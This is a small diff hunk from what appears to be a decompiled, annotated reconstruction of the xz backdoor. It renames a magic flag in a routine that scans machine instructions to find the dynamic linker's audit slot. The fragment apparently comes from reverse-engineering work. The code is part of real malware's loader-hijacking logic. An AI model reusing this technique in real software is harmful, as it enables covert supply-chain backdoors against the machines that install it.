@@ -81,7 +81,7 @@ BOOL find_dl_naudit_slot(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_el
                             (mov_scan_cursor,glro_string_xref,&insn_ctx,X86_OPCODE_1B_MOV_LOAD,(void *)0x0);
           mov_scan_cursor = mov_scan_cursor + 1;
           if (success != FALSE) {
-            if ((insn_ctx.prefix.decoded.flags2 & 1) != 0) {
+            if ((insn_ctx.prefix.decoded.flags2 & DF2_MEM_DISP) != 0) {
               candidate_slot_ptr = (uint *)insn_ctx.mem_disp;
               if (((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                 candidate_slot_ptr = (uint *)((u8 *)(insn_ctx.mem_disp + (long)insn_ctx.instruction) +
